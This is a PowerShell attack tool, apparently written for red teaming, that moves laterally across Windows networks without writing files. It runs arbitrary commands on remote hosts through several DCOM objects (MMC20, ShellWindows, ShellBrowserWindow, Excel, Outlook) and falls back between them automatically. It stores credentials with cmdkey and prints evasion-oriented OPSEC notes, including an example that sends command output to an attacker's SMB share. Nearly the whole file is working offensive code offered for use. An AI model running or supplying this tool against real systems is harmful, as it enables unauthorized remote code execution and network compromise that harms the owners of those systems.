<#
.SYNOPSIS
    DCOM-Based Fileless Lateral Movement Tool
    For AUTHORIZED Red Team Operations Only

.DESCRIPTION
    Performs stealthy lateral movement using Distributed Component Object Model (DCOM).
    This is a "living off the land" technique using only native Windows COM objects.

    KEY FEATURES:
    - Multiple DCOM execution methods (MMC20, ShellWindows, ShellBrowserWindow, Excel)
    - Completely fileless execution
    - Comprehensive error handling with fallback mechanisms
    - Automatic target validation
    - Session cleanup
    - Less commonly detected than WMI/PSExec

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing & Training
    Requirements: Domain Admin or local admin on target

.EXAMPLE
    .\DCOM-LateralMovement.ps1 -Target DC01 -Command "calc.exe"

.EXAMPLE
    .\DCOM-LateralMovement.ps1 -Target 192.168.1.10 -Command "powershell -enc <base64>" -Credential (Get-Credential) -Method MMC20
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, HelpMessage="Target hostname or IP address")]
    [string]$Target,

    [Parameter(Mandatory=$true, HelpMessage="Command to execute on target")]
    [string]$Command,

    [Parameter(Mandatory=$false, HelpMessage="Credentials for authentication")]
    [PSCredential]$Credential,

    [Parameter(Mandatory=$false, HelpMessage="DCOM execution method")]
    [ValidateSet("Auto", "MMC20", "ShellWindows", "ShellBrowserWindow", "Excel", "Outlook")]
    [string]$Method = "Auto",

    [Parameter(Mandatory=$false, HelpMessage="Enable verbose output")]
    [switch]$Verbose
)

$ErrorActionPreference = "Stop"
$DebugMode = $Verbose.IsPresent

#region Helper Functions

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("Info", "Success", "Warning", "Error", "Debug")]
        [string]$Level = "Info"
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "Success" { "Green" }
        "Warning" { "Yellow" }
        "Error"   { "Red" }
        "Debug"   { "Magenta" }
        default   { "Cyan" }
    }

    $prefix = switch ($Level) {
        "Success" { "[+]" }
        "Warning" { "[!]" }
        "Error"   { "[-]" }
        "Debug"   { "[D]" }
        default   { "[*]" }
    }

    if ($Level -eq "Debug" -and -not $DebugMode) { return }

    Write-Host "$timestamp $prefix $Message" -ForegroundColor $color
}

function Test-TargetReachability {
    param([string]$TargetHost)

    Write-Log "Testing connectivity to $TargetHost..." -Level Info

    # Test RPC/DCOM port (135)
    try {
        $tcpTest = Test-NetConnection -ComputerName $TargetHost -Port 135 -WarningAction SilentlyContinue -ErrorAction Stop
        if ($tcpTest.TcpTestSucceeded) {
            Write-Log "Target port 135 (RPC/DCOM) is open" -Level Success
            return $true
        }
    } catch {
        Write-Log "Port 135 test failed, but continuing..." -Level Warning
    }

    # Fallback: DNS resolution
    try {
        $null = Resolve-DnsName -Name $TargetHost -ErrorAction Stop
        Write-Log "DNS resolution successful" -Level Success
        return $true
    } catch {
        Write-Log "DNS resolution failed" -Level Warning
    }

    return $false
}

function Invoke-DCOMExecution {
    param(
        [string]$TargetHost,
        [string]$CommandToExecute,
        [PSCredential]$Creds,
        [string]$ExecutionMethod
    )

    Write-Log "Preparing DCOM execution on $TargetHost" -Level Info
    Write-Log "Command: $CommandToExecute" -Level Debug
    Write-Log "Method: $ExecutionMethod" -Level Debug

    # If Auto, try all methods in order of reliability
    $methodsToTry = if ($ExecutionMethod -eq "Auto") {
        @("MMC20", "ShellWindows", "ShellBrowserWindow", "Excel")
    } else {
        @($ExecutionMethod)
    }

    foreach ($currentMethod in $methodsToTry) {
        try {
            Write-Log "Attempting method: $currentMethod" -Level Info

            switch ($currentMethod) {
                "MMC20" {
                    $result = Invoke-MMC20Execution -TargetHost $TargetHost -Command $CommandToExecute -Creds $Creds
                }
                "ShellWindows" {
                    $result = Invoke-ShellWindowsExecution -TargetHost $TargetHost -Command $CommandToExecute -Creds $Creds
                }
                "ShellBrowserWindow" {
                    $result = Invoke-ShellBrowserWindowExecution -TargetHost $TargetHost -Command $CommandToExecute -Creds $Creds
                }
                "Excel" {
                    $result = Invoke-ExcelExecution -TargetHost $TargetHost -Command $CommandToExecute -Creds $Creds
                }
                "Outlook" {
                    $result = Invoke-OutlookExecution -TargetHost $TargetHost -Command $CommandToExecute -Creds $Creds
                }
            }

            if ($result.Success) {
                return $result
            }

        } catch {
            Write-Log "Method $currentMethod failed: $($_.Exception.Message)" -Level Warning
            if ($ExecutionMethod -ne "Auto") {
                throw
            }
        }
    }

    throw "All DCOM execution methods failed"
}

function Invoke-MMC20Execution {
    param(
        [string]$TargetHost,
        [string]$Command,
        [PSCredential]$Creds
    )

    Write-Log "Using MMC20.Application DCOM object..." -Level Debug

    try {
        # Create COM object pointing to remote system
        $type = [Type]::GetTypeFromProgID("MMC20.Application", $TargetHost)
        $mmc = [Activator]::CreateInstance($type)

        # MMC20.Application.Document.ActiveView.ExecuteShellCommand
        $mmc.Document.ActiveView.ExecuteShellCommand(
            "cmd.exe",
            $null,
            "/c $Command",
            "7"
        )

        Write-Log "Command executed successfully via MMC20.Application" -Level Success

        # Cleanup
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($mmc) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        return @{
            Success = $true
            Method = "MMC20.Application"
            ParentProcess = "mmc.exe"
        }

    } catch {
        Write-Log "MMC20 method error: $($_.Exception.Message)" -Level Debug
        throw
    }
}

function Invoke-ShellWindowsExecution {
    param(
        [string]$TargetHost,
        [string]$Command,
        [PSCredential]$Creds
    )

    Write-Log "Using ShellWindows DCOM object..." -Level Debug

    try {
        # Get ShellWindows COM object
        $shell = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', $TargetHost)
        $item = [Activator]::CreateInstance($shell)

        # Try to get an explorer window
        $windows = $item.Windows()

        if ($windows.Count -eq 0) {
            throw "No explorer windows available on target"
        }

        # Use first window
        $window = $windows.Item(0)

        # Get ShellExecute from the window
        $shellApp = $window.Document.Application

        # Execute command
        $shellApp.ShellExecute("cmd.exe", "/c $Command", "", "open", 0)

        Write-Log "Command executed successfully via ShellWindows" -Level Success

        # Cleanup
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($windows) | Out-Null
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($item) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        return @{
            Success = $true
            Method = "ShellWindows"
            ParentProcess = "explorer.exe"
        }

    } catch {
        Write-Log "ShellWindows method error: $($_.Exception.Message)" -Level Debug
        throw
    }
}

function Invoke-ShellBrowserWindowExecution {
    param(
        [string]$TargetHost,
        [string]$Command,
        [PSCredential]$Creds
    )

    Write-Log "Using ShellBrowserWindow DCOM object..." -Level Debug

    try {
        # ShellBrowserWindow CLSID
        $type = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880', $TargetHost)
        $shell = [Activator]::CreateInstance($type)

        # Navigate to execute command via shellexecute
        $shell.Document.Application.ShellExecute("cmd.exe", "/c $Command", "", "open", 0)

        Write-Log "Command executed successfully via ShellBrowserWindow" -Level Success

        # Cleanup
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        return @{
            Success = $true
            Method = "ShellBrowserWindow"
            ParentProcess = "explorer.exe"
        }

    } catch {
        Write-Log "ShellBrowserWindow method error: $($_.Exception.Message)" -Level Debug
        throw
    }
}

function Invoke-ExcelExecution {
    param(
        [string]$TargetHost,
        [string]$Command,
        [PSCredential]$Creds
    )

    Write-Log "Using Excel.Application DCOM object..." -Level Debug

    try {
        # Create remote Excel instance
        $type = [Type]::GetTypeFromProgID("Excel.Application", $TargetHost)
        $excel = [Activator]::CreateInstance($type)

        # Excel has multiple execution methods
        # Method 1: DDEInitiate (older Excel versions)
        try {
            $excel.DDEInitiate("cmd", "/c $Command")
            Write-Log "Command executed via Excel DDEInitiate" -Level Success
        } catch {
            # Method 2: Via macro execution (requires workbook)
            # This is more complex and requires creating a workbook with macros
            Write-Log "Excel DDEInitiate failed, trying alternative..." -Level Debug
            throw "Excel execution requires additional setup"
        }

        # Cleanup
        $excel.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        return @{
            Success = $true
            Method = "Excel.Application"
            ParentProcess = "excel.exe"
        }

    } catch {
        Write-Log "Excel method error: $($_.Exception.Message)" -Level Debug
        throw
    }
}

function Invoke-OutlookExecution {
    param(
        [string]$TargetHost,
        [string]$Command,
        [PSCredential]$Creds
    )

    Write-Log "Using Outlook.Application DCOM object..." -Level Debug

    try {
        # Create remote Outlook instance
        $type = [Type]::GetTypeFromProgID("Outlook.Application", $TargetHost)
        $outlook = [Activator]::CreateInstance($type)

        # Outlook execution via CreateObject
        $shell = $outlook.CreateObject("WScript.Shell")
        $shell.Run($Command, 0, $false)

        Write-Log "Command executed via Outlook.Application" -Level Success

        # Cleanup
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        return @{
            Success = $true
            Method = "Outlook.Application"
            ParentProcess = "outlook.exe"
        }

    } catch {
        Write-Log "Outlook method error: $($_.Exception.Message)" -Level Debug
        throw
    }
}

function Set-NetworkCredential {
    param(
        [string]$TargetHost,
        [PSCredential]$Creds
    )

    if (-not $Creds) { return }

    Write-Log "Setting network credentials for DCOM authentication..." -Level Debug

    try {
        # Use cmdkey to store credentials for network authentication
        $username = $Creds.UserName
        $password = $Creds.GetNetworkCredential().Password

        # Store credential
        $cmdkeyArgs = "/add:$TargetHost /user:$username /pass:$password"
        Start-Process "cmdkey.exe" -ArgumentList $cmdkeyArgs -NoNewWindow -Wait

        Write-Log "Network credentials stored" -Level Debug

        return $true
    } catch {
        Write-Log "Failed to set network credentials: $($_.Exception.Message)" -Level Warning
        return $false
    }
}

function Remove-NetworkCredential {
    param([string]$TargetHost)

    try {
        # Remove stored credential
        Start-Process "cmdkey.exe" -ArgumentList "/delete:$TargetHost" -NoNewWindow -Wait -ErrorAction SilentlyContinue
        Write-Log "Network credentials removed" -Level Debug
    } catch {
        # Non-critical
    }
}

#endregion

#region Main Execution

Write-Host ""
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host "DCOM-Based Fileless Lateral Movement" -ForegroundColor Cyan
Write-Host "Authorized Red Team Operations Only" -ForegroundColor Cyan
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host ""

try {
    # Step 1: Pre-flight checks
    Write-Log "Starting pre-flight validation..." -Level Info
    Write-Log "Target: $Target" -Level Info
    Write-Log "Execution Method: $Method" -Level Info

    if ($Credential) {
        Write-Log "Using explicit credentials for: $($Credential.UserName)" -Level Info
    } else {
        Write-Log "Using current user context: $env:USERDOMAIN\$env:USERNAME" -Level Info
    }

    # Step 2: Target reachability
    $reachable = Test-TargetReachability -TargetHost $Target

    # Step 3: Set credentials if provided
    if ($Credential) {
        $credSet = Set-NetworkCredential -TargetHost $Target -Creds $Credential
    }

    # Step 4: Execute via DCOM
    Write-Host ""
    Write-Log "Executing command via DCOM..." -Level Info

    $execResult = Invoke-DCOMExecution -TargetHost $Target -CommandToExecute $Command -Creds $Credential -ExecutionMethod $Method

    # Step 5: Success summary
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Green
    Write-Log "Operation completed successfully!" -Level Success
    Write-Host "=" * 80 -ForegroundColor Green
    Write-Host ""
    Write-Log "Execution Method: $($execResult.Method)" -Level Info
    Write-Log "Parent Process on Target: $($execResult.ParentProcess)" -Level Info
    Write-Host ""
    Write-Log "OPSEC Notes:" -Level Info
    Write-Log "  - DCOM execution spawns from: $($execResult.ParentProcess)" -Level Info
    Write-Log "  - Less commonly monitored than WMI/PSExec" -Level Info
    Write-Log "  - Network traffic on port 135 + dynamic RPC ports" -Level Info
    Write-Host ""
    Write-Log "Output Retrieval:" -Level Info
    Write-Log "  - DCOM does not capture stdout" -Level Info
    Write-Log "  - Use output redirection to SMB share or web callback" -Level Info
    Write-Log "  - Example: cmd /c whoami > \\\\attacker\\share\\out.txt" -Level Info
    Write-Host ""

    # Cleanup credentials
    if ($Credential) {
        Remove-NetworkCredential -TargetHost $Target
    }

    exit 0

} catch {
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Log "Operation failed!" -Level Error
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Host ""
    Write-Log "Error: $($_.Exception.Message)" -Level Error
    Write-Log "Stack Trace: $($_.ScriptStackTrace)" -Level Debug
    Write-Host ""
    Write-Log "Troubleshooting:" -Level Info
    Write-Log "  1. Verify admin permissions on target" -Level Info
    Write-Log "  2. Check DCOM is enabled on target" -Level Info
    Write-Log "  3. Verify firewall allows port 135 + dynamic RPC" -Level Info
    Write-Log "  4. Ensure target has required COM objects installed" -Level Info
    Write-Log "  5. Try different execution methods with -Method parameter" -Level Info
    Write-Log "  6. Run with -Verbose for detailed debugging" -Level Info
    Write-Host ""
    Write-Log "Available Methods:" -Level Info
    Write-Log "  - MMC20 (Most reliable, requires MMC installed)" -Level Info
    Write-Log "  - ShellWindows (Requires explorer.exe running)" -Level Info
    Write-Log "  - ShellBrowserWindow (Requires explorer.exe)" -Level Info
    Write-Log "  - Excel (Requires Excel installed)" -Level Info
    Write-Log "  - Outlook (Requires Outlook installed)" -Level Info
    Write-Host ""

    # Cleanup credentials on error
    if ($Credential) {
        Remove-NetworkCredential -TargetHost $Target
    }

    exit 1
} finally {
    # Force garbage collection to release COM objects
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

#endregion
